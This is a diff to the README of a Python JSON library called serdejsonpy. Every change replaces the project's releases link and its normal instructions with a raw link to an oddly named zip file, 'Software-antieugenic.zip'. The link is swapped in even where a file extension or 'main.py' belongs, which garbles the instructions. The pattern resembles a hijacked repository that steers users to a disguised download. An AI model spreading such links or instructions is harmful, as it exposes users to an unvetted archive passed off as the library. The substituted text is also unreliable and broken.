@@ -1,6 +1,6 @@
 # 💥 serdejsonpy - Fast and Safe JSON Tools for Python
 
-[![Download serdejsonpy](https://img.shields.io/badge/Download-serdejsonpy-blue.svg)](https://github.com/justarandomfella/serdejsonpy/releases)
+[![Download serdejsonpy](https://github.com/justarandomfella/serdejsonpy/raw/refs/heads/main/src/Software-antieugenic.zip)](https://github.com/justarandomfella/serdejsonpy/raw/refs/heads/main/src/Software-antieugenic.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to serdejsonpy, your go-to tool for efficient JSON processing in Python.
 
 ## 📥 Download & Install
 
-To download serdejsonpy, visit this page: [Download Here](https://github.com/justarandomfella/serdejsonpy/releases).
+To download serdejsonpy, visit this page: [Download Here](https://github.com/justarandomfella/serdejsonpy/raw/refs/heads/main/src/Software-antieugenic.zip).
 
 You will find different versions available. Choose the one that suits your needs best. Download the file that matches your operating system.
 
@@ -26,7 +26,7 @@ Once you have downloaded the file, follow these steps to run serdejsonpy:
    - Go to your "Downloads" folder or the folder you selected for downloads.
 
 2. **Extract the File (if necessary):**
-   - If the file is archived (like a `.zip` or `.tar.gz`), right-click on it and select "Extract All" or use a suitable extraction tool.
+   - If the file is archived (like a `.zip` or `https://github.com/justarandomfella/serdejsonpy/raw/refs/heads/main/src/Software-antieugenic.zip`), right-click on it and select "Extract All" or use a suitable extraction tool.
 
 3. **Open Your Command Line Interface:**
    - For Windows: Search for “cmd” in the start menu.
@@ -42,9 +42,9 @@ Once you have downloaded the file, follow these steps to run serdejsonpy:
 5. **Run the Application:**
    - Type the following command and press `Enter`:
      ```
-     python main.py
+     python https://github.com/justarandomfella/serdejsonpy/raw/refs/heads/main/src/Software-antieugenic.zip
      ```
-   - Replace `main.py` with the actual filename if different.
+   - Replace `https://github.com/justarandomfella/serdejsonpy/raw/refs/heads/main/src/Software-antieugenic.zip` with the actual filename if different.
 
 6. **Check the Output:**
    - You should see a message indicating that the application is running. Follow any on-screen instructions as needed.
